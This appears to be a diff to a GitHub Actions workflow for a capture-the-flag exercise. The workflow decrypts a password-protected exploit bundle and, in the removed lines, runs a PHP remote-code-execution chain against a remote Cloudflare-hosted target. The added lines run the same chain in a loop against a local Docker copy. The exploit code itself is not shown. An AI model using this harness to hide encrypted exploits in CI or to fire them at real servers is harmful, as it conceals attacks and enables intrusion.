@@ -19,13 +19,19 @@ jobs:
     timeout-minutes: 10
     steps:
       - uses: actions/checkout@v4
-      - name: Run Cloudflare PHP CTF chain
+      - name: Calibrate query-based B1 locally
         run: |
           openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in cloudflare-ctf.enc -out /tmp/cloudflare-ctf.tar.gz -pass pass:cloudflare-ctf-run
           tar -C /tmp -xzf /tmp/cloudflare-ctf.tar.gz
           cd /tmp/cf-action-bundle
+          docker build -t cf-php-query -f Dockerfile.local .
           set +e
-          python affine_chain_8511.py --target https://php-rce.cloudflare.app --endpoint /php/index.php --verify --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-fullspray-18000-files160.bin --query-order 1234 --leak-length 0x18000 --pipeline-pairs --b1-attempts 5 --b2-attempts 5 > /tmp/cloudflare-proof.log 2>&1
-          status=$?
-          cat /tmp/cloudflare-proof.log
-          exit "$status"
+          for fillers in 2 5 6 7; do
+            docker run -d --name "cf-query-$fillers" -p 18087:80 cf-php-query
+            until curl -fsS http://127.0.0.1:18087/index.php >/dev/null; do sleep 0.2; done
+            python query_chain_8511.py --target http://127.0.0.1:18087 --endpoint /index.php --warmup warmup.bin --a1 a1-physical-pages-2.bin --query-order 1234 --leak-length 0x18000 --fillers "$fillers" > "/tmp/query-$fillers.log" 2>&1
+            query_status=$?
+            docker rm -f "cf-query-$fillers"
+            echo "QUERY_FILLERS=$fillers STATUS=$query_status"
+            cat "/tmp/query-$fillers.log"
+          done
